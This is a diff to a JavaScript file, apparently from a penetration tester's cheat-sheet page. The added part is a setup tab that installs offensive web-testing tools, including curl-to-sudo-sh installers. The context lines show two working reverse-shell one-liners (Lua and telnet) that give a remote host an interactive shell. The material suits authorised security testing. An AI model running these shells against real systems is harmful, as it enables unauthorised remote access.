@@ -63,3 +63,26 @@ window.REVSHELLS = [
   { lang: "lua",        name: "lua",             cmd: `lua -e "require('socket');require('os');t=socket.tcp();t:connect('{tester_ip}','{tester_port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"` },
   { lang: "telnet",     name: "telnet",          cmd: `TF=$(mktemp -u);mkfifo $TF && telnet {tester_ip} {tester_port} 0<$TF | /bin/sh 1>$TF` }
 ];
+
+/* Setup tab — tooling install commands (static, not templated). */
+window.SETUP = [
+  { group: "apt (Kali repo)", note: "apt skips anything already installed.", cmds: [
+    { tool: "apt", cmd: "sudo apt update && sudo apt install -y jq seclists wordlists ffuf feroxbuster gobuster dirsearch nuclei subfinder amass dalfox arjun sqlmap wfuzz nikto whatweb commix testssl.sh dotdotpwn sslscan rlwrap socat pwncat pipx golang-go git" }
+  ]},
+  { group: "PATH (Go + pipx bins)", cmds: [
+    { tool: "path", cmd: "echo 'export PATH=\"$PATH:$HOME/go/bin:$HOME/.local/bin\"' >> ~/.zshrc && source ~/.zshrc && pipx ensurepath" }
+  ]},
+  { group: "Go tools", note: "needs golang-go (in the apt line).", cmds: [
+    { tool: "go", cmd: "for p in github.com/lc/gau/v2/cmd/gau github.com/hakluke/hakrawler github.com/projectdiscovery/katana/cmd/katana github.com/projectdiscovery/httpx/cmd/httpx github.com/projectdiscovery/interactsh/cmd/interactsh-client github.com/tomnomnom/waybackurls github.com/tomnomnom/gf github.com/tomnomnom/qsreplace github.com/tomnomnom/anew github.com/Emoe/kxss github.com/jaeles-project/gospider; do go install \"$p@latest\"; done" }
+  ]},
+  { group: "pipx (isolated Python CLIs)", cmds: [
+    { tool: "pipx", cmd: "for p in git-dumper uro clairvoyance xsser name-that-hash; do pipx install \"$p\"; done" }
+  ]},
+  { group: "git tools -> /opt", note: "run e.g. python3 /opt/XSStrike/xsstrike.py", cmds: [
+    { tool: "git", cmd: "sudo mkdir -p /opt && sudo chown $USER /opt; for r in s0md3v/XSStrike ticarpi/jwt_tool dolevf/graphw00f chenjj/CORScanner tarunkant/Gopherus; do git clone -q https://github.com/$r /opt/$(basename $r); done" }
+  ]},
+  { group: "static binaries", cmds: [
+    { tool: "trufflehog", cmd: "curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sudo sh -s -- -b /usr/local/bin" },
+    { tool: "gitleaks", cmd: "curl -sSL https://github.com/gitleaks/gitleaks/releases/latest/download/gitleaks_8.18.4_linux_x64.tar.gz | tar xz -C /tmp gitleaks && sudo mv /tmp/gitleaks /usr/local/bin/" }
+  ]}
+];
